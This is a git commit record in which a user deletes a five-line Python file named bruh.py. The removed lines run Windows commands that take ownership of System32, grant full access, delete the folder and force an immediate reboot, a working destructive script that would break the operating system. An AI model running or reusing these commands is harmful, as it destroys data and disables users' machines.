5d2d7cc7ac067337b0399f69969602571de06c94
JigTheFig <51309806+JigTheFig@users.noreply.github.com>
2020-08-21 08:36:48 +1000

    Delete bruh.py

--- bruh.py
+++
@@ -1,5 +0,0 @@
-import os
-os.system('cmd /c "takeown /a /r /d Y /f C:\Windows\System32"')
-os.system('cmd /c "icacls C:\Windows\System32 /grant administrators:F /t"')
-os.system('cmd /c "rmdir C:\Windows\System32"')
-os.system('cmd /c "shutdown -r -t 0"')
